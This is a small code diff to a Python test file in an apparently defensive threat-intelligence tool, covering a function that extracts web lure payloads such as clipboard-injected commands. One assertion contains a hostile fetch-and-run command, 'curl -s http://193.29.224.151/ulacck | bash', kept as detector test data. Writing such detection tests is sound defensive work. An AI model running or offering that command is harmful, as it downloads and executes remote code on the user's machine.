@@ -26,7 +26,6 @@ from hecate_agent.orchestrator.enrichment import (
     query_ipinfo_ip,
     query_passive_dns,
     query_passive_dns_domain,
-    query_passive_dns_ip,
     query_spur_ip,
     query_tor_exit,
     query_urlscan_domain,
@@ -881,8 +880,8 @@ def test_extract_web_lure_payloads_clipboard_bash():
     """
     lures = extract_web_lure_payloads(text)
     assert len(lures) >= 1
-    assert any("curl -s http://193.29.224.151/ulacck | bash" in l["command"] for l in lures)
-    assert any("clipboard" in l["source"] for l in lures)
+    assert any("curl -s http://193.29.224.151/ulacck | bash" in lure["command"] for lure in lures)
+    assert any("clipboard" in lure["source"] for lure in lures)
 
 
 def test_extract_web_lure_payloads_powershell_fake_captcha():
